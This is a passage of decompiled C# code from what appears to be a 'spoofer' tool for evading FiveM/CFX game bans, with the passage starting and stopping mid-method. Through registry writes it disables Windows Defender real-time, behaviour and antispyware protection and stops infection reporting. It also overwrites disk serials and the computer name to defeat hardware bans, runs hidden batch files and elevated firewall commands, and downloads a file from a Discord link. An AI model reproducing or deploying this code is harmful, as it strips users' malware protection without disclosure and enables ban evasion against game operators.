      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoResolveSearch", (object) "00000001", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoResolveTrack", (object) "00000001", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", "NoInternetOpenWith", (object) "00000001", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control", "WaitToKillServiceTimeout", (object) "2000");
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "Start", (object) "4", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagsvc", "Start", (object) "4", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagnosticshub.standardcollector.service", "Start", (object) "4", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "Start", (object) "4", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", "SystemResponsiveness", (object) 1, RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "GPU Priority", (object) 8, RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "Priority", (object) 6, RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "Scheduling Category", (object) "High", RegistryValueKind.String);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", "SFIO Priority", (object) "High", RegistryValueKind.String);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "GPU Priority", (object) 0, RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "Priority", (object) 8, RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "Scheduling Category", (object) "Medium", RegistryValueKind.String);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", "SFIO Priority", (object) "High", RegistryValueKind.String);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", true).DeleteValue("Append Completion", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\AutoComplete", true).DeleteValue("AutoSuggest", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer", true).DeleteValue("EnableAutoTray", false);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Remote Assistance", "fAllowToGetHelp", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "DisallowShaking", (object) "0", RegistryValueKind.DWord);
      Registry.ClassesRoot.DeleteSubKeyTree("AllFilesystemObjects\\\\shellex\\\\ContextMenuHandlers\\\\Copy To", false);
      Registry.ClassesRoot.DeleteSubKeyTree("AllFilesystemObjects\\\\shellex\\\\ContextMenuHandlers\\\\Move To", false);
      Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("AutoEndTasks", false);
      Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("HungAppTimeout", false);
      Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("WaitToKillAppTimeout", false);
      Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", true).DeleteValue("LowLevelHooksTimeout", false);
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Desktop", "MenuShowDelay", (object) "400");
      Registry.SetValue("HKEY_CURRENT_USER\\Control Panel\\Mouse", "MouseHoverTime", (object) "400");
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoLowDiskSpaceChecks", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("LinkResolveIgnoreLinkInfo", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoResolveSearch", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoResolveTrack", false);
      Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer", true).DeleteValue("NoInternetOpenWith", false);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control", "WaitToKillServiceTimeout", (object) "5000");
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack", "Start", (object) "2", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\diagnosticshub.standardcollector.service", "Start", (object) "2", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\dmwappushservice", "Start", (object) "2", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "HideFileExt", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile", "SystemResponsiveness", (object) 14, RegistryValueKind.DWord);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("GPU Priority", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("Priority", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("Scheduling Category", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Games", true).DeleteValue("SFIO Priority", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("GPU Priority", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("Priority", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("Scheduling Category", false);
      Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Multimedia\\SystemProfile\\Tasks\\Low Latency", true).DeleteValue("SFIO Priority", false);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\System", "PublishUserActivities", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\SQMClient\\Windows", "CEIPEnable", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "AITEnable", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisableInventory", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisablePCA", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\AppCompat", "DisableUAR", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Device Metadata", "PreventDeviceMetadataFromNetwork", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\MRT", "DontOfferThroughWUAU", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\AutoLogger\\SQMLogger", "Start", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\PolicyManager\\current\\device\\System", "AllowExperimentation", (object) 0);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiVirus", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableSpecialRunningModes", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRoutinelyTakingAction", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "ServiceKeepAlive", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableRealtimeMonitoring", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Signature Updates", "ForceUpdateFromMU", (object) 0);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet", "DisableBlockAtFirstSeen", (object) 1);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\MpEngine", "MpEnablePus", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "PUAProtection", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Policy Manager", "DisableScanningNetworkFiles", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableRealtimeMonitoring", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet", "SpyNetReporting", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows Defender\\Spynet", "SubmitSamplesConsent", (object) "0", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MRT", "DontReportInfectionInformation", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\MRT", "DontOfferThroughWUAU", (object) "1", RegistryValueKind.DWord);
      Registry.ClassesRoot.DeleteSubKeyTree("\\CLSID\\{09A47860-11B0-4DA5-AFA5-26D86198A780}", false);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", (object) "1", RegistryValueKind.DWord);
      Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", (object) "1", RegistryValueKind.DWord);
      string path1 = "C:\\Program Files\\Win64";
      if (!Directory.Exists(path1))
        Directory.CreateDirectory(path1);
      if (!System.IO.File.Exists("C:\\Program Files\\Win64\\net.bat"))
      {
        string path2 = "C:\\Program Files\\Win64\\net.bat";
        using (StreamWriter text = System.IO.File.CreateText(path2))
          text.WriteLine("netsh int ip reset");
        Process process = new Process();
        process.StartInfo.FileName = path2;
        System.IO.File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
        process.Start();
      }
      else
        Process.Start("C:\\Program Files\\Win64\\net.bat");
      UserControl2.HWIDclick();
      UserControl2.XBOXclick();
      UserControl2.PCclick();
      UserControl2.Diskclick();
      UserControl2.FiveM();
      Thread.Sleep(2000);
      string path3 = "C:\\Program Files\\Sounds";
      if (!Directory.Exists(path3))
        Directory.CreateDirectory(path3);
      if (!System.IO.File.Exists("C:\\Program Files\\Sounds\\fivemspoofed.wav"))
      {
        new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/953684464104513571/959156445411180574/fivemspoofed.wav", "C:\\Program Files\\Sounds\\fivemspoofed.wav");
        System.IO.File.SetAttributes("C:\\Program Files\\Sounds\\fivemspoofed.wav", FileAttributes.Hidden);
        new SoundPlayer("C:\\Program Files\\Sounds\\fivemspoofed.wav").Play();
      }
      else
        new SoundPlayer("C:\\Program Files\\Sounds\\fivemspoofed.wav").Play();
      int num = (int) MessageBox.Show("Spoofed FiveM, Use new rockstar,steam,discord and restart your pc!", "Legion Woofer - Fast CFX unban", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
      System.IO.File.Delete("C:\\Program Files\\Sounds\\fivemspoofed.wav");
    }

    public static string GenerateString(int size)
    {
      char[] chArray = new char[size];
      for (int index = 0; index < size; ++index)
        chArray[index] = "ABCDEF0123456789"[UserControl2.random.Next("ABCDEF0123456789".Length)];
      return new string(chArray);
    }

    private void guna2Button7_Click(object sender, EventArgs e)
    {
      foreach (string subKeyName1 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi").GetSubKeyNames())
      {
        foreach (string subKeyName2 in Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + subKeyName1).GetSubKeyNames())
        {
          RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("HARDWARE\\DEVICEMAP\\Scsi\\" + subKeyName1 + "\\" + subKeyName2 + "\\Target Id 0\\Logical Unit Id 0", true);
          if (registryKey != null && registryKey.GetValue("DeviceType").ToString() == "DiskPeripheral")
          {
            string s1 = "Q1DXBDCF9JHVQQ";
            string s2 = "Q1DXBDCF9JHVQQ";
            registryKey.SetValue("DeviceIdentifierPage", (object) Encoding.UTF8.GetBytes(s2));
            registryKey.SetValue("Identifier", (object) s1);
            registryKey.SetValue("InquiryData", (object) Encoding.UTF8.GetBytes(s1));
            registryKey.SetValue("SerialNumber", (object) s2);
          }
        }
      }
      foreach (string subKeyName in Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral").GetSubKeyNames())
        Registry.LocalMachine.OpenSubKey("HARDWARE\\DESCRIPTION\\System\\MultifunctionAdapter\\0\\DiskController\\0\\DiskPeripheral\\" + subKeyName, true).SetValue("Identifier", (object) ("Q1DXBDCF" + "-" + "Q1DXBDCF" + "-A"));
      int num = (int) MessageBox.Show("Spoofed Nvme Disk!", "Lean Woofer", MessageBoxButtons.OK);
    }

    public static string RandomId(int length)
    {
      string str1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
      string str2 = "";
      Random random = new Random();
      for (int index = 0; index < length; ++index)
        str2 += str1[random.Next(str1.Length)].ToString();
      return str2;
    }

    public static void ClickUnban()
    {
      List<Process> processList = new List<Process>();
      new d().b();
      string path1 = "C:\\Program Files\\Win64";
      if (!Directory.Exists(path1))
        Directory.CreateDirectory(path1);
      if (!System.IO.File.Exists("C:\\Program Files\\Win64\\net.bat"))
      {
        string path2 = "C:\\Program Files\\Win64\\net.bat";
        using (StreamWriter text = System.IO.File.CreateText(path2))
          text.WriteLine("netsh int ip reset");
        Process process = new Process();
        process.StartInfo.FileName = path2;
        processList.Add(process);
        System.IO.File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
        process.Start();
      }
      else
        Process.Start("C:\\Program Files\\Win64\\net.bat");
      UserControl2.HWIDclick();
      UserControl2.XBOXclick();
      UserControl2.PCclick();
      UserControl2.Diskclick();
      UserControl2.FiveM();
    }

    private void guna2Button5_Click(object sender, EventArgs e)
    {
      UserControl2.FiveM();
      UserControl2.ClickUnban();
      int num = (int) MessageBox.Show("Spoofed G-Life Identifiers, Flash your bios and use vpn!", "Devils Woofer Premium", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
    }

    public static void SpoofPCName()
    {
      RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64).OpenSubKey("SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ActiveComputerName", true);
      registryKey.SetValue("ComputerName", (object) ("DESKTOP-" + UserControl2.GenerateString(6)));
      registryKey.Close();
    }

    private void guna2Button6_Click(object sender, EventArgs e)
    {
    }

    private void guna2TextBox1_TextChanged(object sender, EventArgs e)
    {
    }

    private void guna2Button3_Click(object sender, EventArgs e)
    {
      new Process()
      {
        StartInfo = {
          FileName = "cmd.exe",
          CreateNoWindow = true,
          RedirectStandardInput = true,
          RedirectStandardOutput = true,
          UseShellExecute = false,
          Verb = "runas",
          Arguments = "/C netsh advfirewall firewall add rule name = \"FiveM2372Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\fivem_b2372_gtaprocess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =out new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =in new enable= no > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =out new enable= no > nul"
        }
      }.Start();
      int num = (int) MessageBox.Show("FiveM Bypassed Disabled", "Legion Spoofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
    }

    protected override void Dispose(bool disposing)
    {
      if (disposing && this.components != null)
        this.components.Dispose();
      base.Dispose(disposing);
    }

    private void InitializeComponent()
    {
      this.components = (IContainer) new Container();
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (UserControl2));
      this.label1 = new Label();
      this.label6 = new Label();
      this.guna2PictureBox1 = new Guna2PictureBox();
      this.guna2Button8 = new Guna2Button();
      this.guna2Button7 = new Guna2Button();
      this.guna2Button5 = new Guna2Button();
      this.guna2Button2 = new Guna2Button();
      this.guna2Button1 = new Guna2Button();
      this.timer1 = new System.Windows.Forms.Timer(this.components);
      this.guna2Button3 = new Guna2Button();
      ((ISupportInitialize) this.guna2PictureBox1).BeginInit();
      this.SuspendLayout();
      this.label1.AutoSize = true;
      this.label1.Font = new Font("Segoe UI Black", 15.75f, FontStyle.Bold, GraphicsUnit.Point, (byte) 0);
      this.label1.ForeColor = System.Drawing.Color.White;
      this.label1.Location = new Point(76, 19);
      this.label1.Name = "label1";
      this.label1.Size = new Size(193, 30);
      this.label1.TabIndex = 14;
      this.label1.Text = "Premium Options";
      this.label6.AutoSize = true;
      this.label6.Font = new Font("Segoe UI Black", 5.75f, FontStyle.Bold);
      this.label6.ForeColor = System.Drawing.Color.White;
      this.label6.Location = new Point(85, 49);
      this.label6.Name = "label6";
      this.label6.Size = new Size(139, 11);
      this.label6.TabIndex = 23;
      this.label6.Text = "Custom Options for premium users";
      this.guna2PictureBox1.FillColor = System.Drawing.Color.Transparent;
      this.guna2PictureBox1.Image = (Image) componentResourceManager.GetObject("guna2PictureBox1.Image");
      this.guna2PictureBox1.ImageRotate = 0.0f;
      this.guna2PictureBox1.Location = new Point(33, 19);
      this.guna2PictureBox1.Name = "guna2PictureBox1";
      this.guna2PictureBox1.Size = new Size(46, 41);
      this.guna2PictureBox1.SizeMode = PictureBoxSizeMode.Zoom;
      this.guna2PictureBox1.TabIndex = 32;
      this.guna2PictureBox1.TabStop = false;
      this.guna2Button8.AutoRoundedCorners = true;
      this.guna2Button8.BorderRadius = 13;
      this.guna2Button8.BorderThickness = 1;
      this.guna2Button8.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
      this.guna2Button8.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
      this.guna2Button8.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
      this.guna2Button8.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
      this.guna2Button8.FillColor = System.Drawing.Color.White;
      this.guna2Button8.Font = new Font("Segoe UI Black", 9f, FontStyle.Bold);
      this.guna2Button8.ForeColor = System.Drawing.Color.Black;
      this.guna2Button8.Location = new Point(42, 281);
      this.guna2Button8.Name = "guna2Button8";
      this.guna2Button8.Size = new Size(416, 29);
      this.guna2Button8.TabIndex = 40;
      ((Control) this.guna2Button8).Text = "1 Click Cfx unban";
      this.guna2Button8.Click += new EventHandler(this.guna2Button8_Click);
      this.guna2Button7.AutoRoundedCorners = true;
      this.guna2Button7.BorderRadius = 13;
      this.guna2Button7.BorderThickness = 1;
      this.guna2Button7.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
      this.guna2Button7.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
      this.guna2Button7.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
      this.guna2Button7.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
      this.guna2Button7.FillColor = System.Drawing.Color.White;
      this.guna2Button7.Font = new Font("Segoe UI Black", 9f, FontStyle.Bold);
      this.guna2Button7.ForeColor = System.Drawing.Color.Black;
      this.guna2Button7.Location = new Point(317, 91);
      this.guna2Button7.Name = "guna2Button7";
      this.guna2Button7.Size = new Size(141, 29);
      this.guna2Button7.TabIndex = 39;
      ((Control) this.guna2Button7).Text = "NVME Disk Spoof";
      this.guna2Button7.Click += new EventHandler(this.guna2Button7_Click);
      this.guna2Button5.AutoRoundedCorners = true;
      this.guna2Button5.BorderRadius = 13;
      this.guna2Button5.BorderThickness = 1;
      this.guna2Button5.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
      this.guna2Button5.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
      this.guna2Button5.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
      this.guna2Button5.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
      this.guna2Button5.FillColor = System.Drawing.Color.White;
      this.guna2Button5.Font = new Font("Segoe UI Black", 9f, FontStyle.Bold);
      this.guna2Button5.ForeColor = System.Drawing.Color.Black;
      this.guna2Button5.Location = new Point(317, 219);
      this.guna2Button5.Name = "guna2Button5";
      this.guna2Button5.Size = new Size(141, 29);
      this.guna2Button5.TabIndex = 37;
      ((Control) this.guna2Button5).Text = "G Life Unban";
      this.guna2Button5.Click += new EventHandler(this.guna2Button5_Click);
      this.guna2Button2.AutoRoundedCorners = true;
      this.guna2Button2.BorderRadius = 13;
      this.guna2Button2.BorderThickness = 1;
      this.guna2Button2.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
      this.guna2Button2.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
      this.guna2Button2.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
      this.guna2Button2.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
      this.guna2Button2.FillColor = System.Drawing.Color.White;
      this.guna2Button2.Font = new Font("Segoe UI Black", 9f, FontStyle.Bold);
      this.guna2Button2.ForeColor = System.Drawing.Color.Black;
      this.guna2Button2.Location = new Point(42, 219);
      this.guna2Button2.Name = "guna2Button2";
      this.guna2Button2.Size = new Size(141, 29);
      this.guna2Button2.TabIndex = 34;
      ((Control) this.guna2Button2).Text = "Nvidia Bypass";
      this.guna2Button2.Click += new EventHandler(this.guna2Button2_Click);
      this.guna2Button1.AutoRoundedCorners = true;
      this.guna2Button1.BorderRadius = 13;
      this.guna2Button1.BorderThickness = 1;
      this.guna2Button1.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
      this.guna2Button1.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
      this.guna2Button1.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
      this.guna2Button1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
      this.guna2Button1.FillColor = System.Drawing.Color.White;
      this.guna2Button1.Font = new Font("Segoe UI Black", 9f, FontStyle.Bold);
      this.guna2Button1.ForeColor = System.Drawing.Color.Black;
      this.guna2Button1.Location = new Point(42, 91);
      this.guna2Button1.Name = "guna2Button1";
      this.guna2Button1.Size = new Size(141, 29);
      this.guna2Button1.TabIndex = 33;
      ((Control) this.guna2Button1).Text = "FiveM Bypass";
      this.guna2Button1.Click += new EventHandler(this.guna2Button1_Click);
      this.guna2Button3.AutoRoundedCorners = true;
      this.guna2Button3.BorderRadius = 13;
      this.guna2Button3.BorderThickness = 1;
      this.guna2Button3.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
      this.guna2Button3.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
      this.guna2Button3.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
      this.guna2Button3.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
      this.guna2Button3.FillColor = System.Drawing.Color.White;
      this.guna2Button3.Font = new Font("Segoe UI Black", 9f, FontStyle.Bold);
      this.guna2Button3.ForeColor = System.Drawing.Color.Black;
      this.guna2Button3.Location = new Point(179, 154);
      this.guna2Button3.Name = "guna2Button3";
      this.guna2Button3.Size = new Size(141, 29);
      this.guna2Button3.TabIndex = 41;
      ((Control) this.guna2Button3).Text = "Disable Bypass";
      this.guna2Button3.Click += new EventHandler(this.guna2Button3_Click);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = System.Drawing.Color.Transparent;
      this.Controls.Add((Control) this.guna2Button3);
      this.Controls.Add((Control) this.guna2Button8);
      this.Controls.Add((Control) this.guna2Button7);
      this.Controls.Add((Control) this.guna2Button5);
      this.Controls.Add((Control) this.guna2Button2);
      this.Controls.Add((Control) this.guna2Button1);
      this.Controls.Add((Control) this.guna2PictureBox1);
      this.Controls.Add((Control) this.label6);
      this.Controls.Add((Control) this.label1);
      this.Name = nameof (UserControl2);
      this.Size = new Size(663, 389);
      this.Load += new EventHandler(this.UserControl2_Load);
      ((ISupportInitialize) this.guna2PictureBox1).EndInit();
